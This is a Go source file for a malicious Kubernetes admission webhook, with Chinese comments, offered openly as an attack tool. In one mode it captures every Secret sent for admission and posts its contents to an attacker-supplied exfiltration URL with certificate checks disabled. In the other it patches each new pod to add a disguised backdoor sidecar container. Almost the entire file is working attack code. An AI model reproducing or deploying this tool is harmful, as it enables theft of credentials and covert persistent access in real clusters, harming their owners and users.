package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

// ==================== 类型定义 ====================

// AdmissionReview Webhook 请求/响应结构
type AdmissionReview struct {
	APIVersion string             `json:"apiVersion"`
	Kind       string             `json:"kind"`
	Request    *AdmissionRequest  `json:"request,omitempty"`
	Response   *AdmissionResponse `json:"response,omitempty"`
}

// AdmissionRequest Webhook 请求
type AdmissionRequest struct {
	UID       string           `json:"uid"`
	Kind      GroupVersionKind `json:"kind"`
	Name      string           `json:"name"`
	Namespace string           `json:"namespace"`
	Object    json.RawMessage  `json:"object"`
}

// GroupVersionKind 资源类型
type GroupVersionKind struct {
	Kind string `json:"kind"`
}

// AdmissionResponse Webhook 响应
type AdmissionResponse struct {
	UID       string `json:"uid"`
	Allowed   bool   `json:"allowed"`
	PatchType string `json:"patchType,omitempty"`
	Patch     string `json:"patch,omitempty"`
}

// Secret K8s Secret 结构
type Secret struct {
	Metadata Metadata          `json:"metadata"`
	Data     map[string]string `json:"data"`
	Type     string            `json:"type"`
}

// Metadata 资源元数据
type Metadata struct {
	Name string `json:"name"`
}

// Pod K8s Pod 结构
type Pod struct {
	Spec PodSpec `json:"spec"`
}

// PodSpec Pod 规格
type PodSpec struct {
	Containers []Container `json:"containers"`
}

// Container 容器定义
type Container struct {
	Name string `json:"name"`
}

// ==================== 配置 ====================

type webhookConfig struct {
	Mode            string
	ExfilURL        string
	BackdoorImage   string
	BackdoorName    string
	BackdoorCommand []string
	CertFile        string
	KeyFile         string
	Port            string
}

var cfg webhookConfig

func init() {
	flag.StringVar(&cfg.Mode, "mode", "", "Webhook mode: secret-exfil or pod-backdoor")
	flag.StringVar(&cfg.ExfilURL, "exfil-url", "", "URL to exfiltrate secrets to")
	flag.StringVar(&cfg.BackdoorImage, "backdoor-image", "busybox", "Backdoor container image")
	flag.StringVar(&cfg.BackdoorName, "backdoor-name", "kctl-sidecar", "Backdoor container name")
	flag.StringVar(&cfg.CertFile, "cert", "/certs/tls.crt", "TLS certificate file")
	flag.StringVar(&cfg.KeyFile, "key", "/certs/tls.key", "TLS key file")
	flag.StringVar(&cfg.Port, "port", "443", "Server port")

	var backdoorCmd string
	flag.StringVar(&backdoorCmd, "backdoor-command", "sleep,infinity", "Backdoor command (comma-separated)")
	flag.Parse()

	cfg.BackdoorCommand = strings.Split(backdoorCmd, ",")
}

// getEnv 获取环境变量，如果为空则返回默认值
func getEnv(key, defaultVal string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return defaultVal
}

func loadConfig() {
	cfg.Mode = getEnv("WEBHOOK_MODE", cfg.Mode)
	cfg.ExfilURL = getEnv("EXFIL_URL", cfg.ExfilURL)
	cfg.BackdoorImage = getEnv("BACKDOOR_IMAGE", cfg.BackdoorImage)
	cfg.BackdoorName = getEnv("BACKDOOR_NAME", cfg.BackdoorName)

	if cmd := os.Getenv("BACKDOOR_COMMAND"); cmd != "" {
		cfg.BackdoorCommand = strings.Split(cmd, ",")
	}
}

// ==================== 主函数 ====================

func main() {
	loadConfig()

	if cfg.Mode == "" {
		log.Fatal("mode is required: secret-exfil or pod-backdoor")
	}

	log.Printf("Starting webhook server in %s mode on port %s", cfg.Mode, cfg.Port)

	http.HandleFunc("/", handleWebhook)
	http.HandleFunc("/healthz", handleHealth)

	server := &http.Server{
		Addr: ":" + cfg.Port,
		TLSConfig: &tls.Config{
			Certificates: loadCert(),
			MinVersion:   tls.VersionTLS12,
		},
	}

	log.Fatal(server.ListenAndServeTLS("", ""))
}

func loadCert() []tls.Certificate {
	cert, err := tls.LoadX509KeyPair(cfg.CertFile, cfg.KeyFile)
	if err != nil {
		log.Fatalf("Failed to load TLS cert: %v", err)
	}
	return []tls.Certificate{cert}
}

// ==================== HTTP 处理 ====================

func handleHealth(w http.ResponseWriter, _ *http.Request) {
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte("ok"))
}

func handleWebhook(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	_ = r.Body.Close()
	if err != nil {
		log.Printf("Error reading body: %v", err)
		http.Error(w, "Error reading body", http.StatusBadRequest)
		return
	}

	var review AdmissionReview
	if err := json.Unmarshal(body, &review); err != nil {
		log.Printf("Error unmarshaling request: %v", err)
		http.Error(w, "Error parsing request", http.StatusBadRequest)
		return
	}

	review.Response = processRequest(&review)
	review.Request = nil

	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(review); err != nil {
		log.Printf("Error encoding response: %v", err)
	}
}

func processRequest(review *AdmissionReview) *AdmissionResponse {
	response := &AdmissionResponse{
		UID:     review.Request.UID,
		Allowed: true,
	}

	switch cfg.Mode {
	case "secret-exfil":
		handleSecretExfil(review)
	case "pod-backdoor":
		handlePodBackdoor(review, response)
	}

	return response
}

// ==================== Secret 窃取 ====================

func handleSecretExfil(review *AdmissionReview) {
	if review.Request.Kind.Kind != "Secret" {
		return
	}

	var secret Secret
	if err := json.Unmarshal(review.Request.Object, &secret); err != nil {
		log.Printf("Error parsing secret: %v", err)
		return
	}

	log.Printf("[SECRET] %s/%s type=%s keys=%v",
		review.Request.Namespace, secret.Metadata.Name,
		secret.Type, mapKeys(secret.Data))

	if cfg.ExfilURL != "" {
		go exfiltrateSecret(review.Request.Namespace, &secret)
	}
}

func exfiltrateSecret(namespace string, secret *Secret) {
	data, err := json.Marshal(map[string]interface{}{
		"namespace": namespace,
		"name":      secret.Metadata.Name,
		"type":      secret.Type,
		"data":      secret.Data,
	})
	if err != nil {
		log.Printf("Error marshaling exfil data: %v", err)
		return
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, //nolint:gosec // 故意跳过证书验证
				MinVersion:         tls.VersionTLS12,
			},
		},
	}

	resp, err := client.Post(cfg.ExfilURL, "application/json", bytes.NewReader(data))
	if err != nil {
		log.Printf("Error exfiltrating: %v", err)
		return
	}
	_ = resp.Body.Close()

	log.Printf("[EXFIL] Sent %s/%s to %s (status: %d)",
		namespace, secret.Metadata.Name, cfg.ExfilURL, resp.StatusCode)
}

// ==================== Pod 后门注入 ====================

func handlePodBackdoor(review *AdmissionReview, response *AdmissionResponse) {
	if review.Request.Kind.Kind != "Pod" {
		return
	}

	var pod Pod
	if err := json.Unmarshal(review.Request.Object, &pod); err != nil {
		log.Printf("Error parsing pod: %v", err)
		return
	}

	// 检查是否已有后门容器
	for _, c := range pod.Spec.Containers {
		if c.Name == cfg.BackdoorName {
			log.Printf("[SKIP] Pod %s/%s already has backdoor",
				review.Request.Namespace, review.Request.Name)
			return
		}
	}

	// 创建 JSON Patch
	patch, err := json.Marshal([]map[string]interface{}{
		{
			"op":   "add",
			"path": "/spec/containers/-",
			"value": map[string]interface{}{
				"name":            cfg.BackdoorName,
				"image":           cfg.BackdoorImage,
				"command":         cfg.BackdoorCommand,
				"imagePullPolicy": "IfNotPresent",
				"resources": map[string]interface{}{
					"limits":   map[string]string{"cpu": "50m", "memory": "64Mi"},
					"requests": map[string]string{"cpu": "10m", "memory": "32Mi"},
				},
			},
		},
	})
	if err != nil {
		log.Printf("Error marshaling patch: %v", err)
		return
	}

	response.PatchType = "JSONPatch"
	response.Patch = base64.StdEncoding.EncodeToString(patch)

	log.Printf("[INJECT] Added %s to pod %s/%s",
		cfg.BackdoorName, review.Request.Namespace, review.Request.Name)
}

// ==================== 工具函数 ====================

func mapKeys(m map[string]string) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}
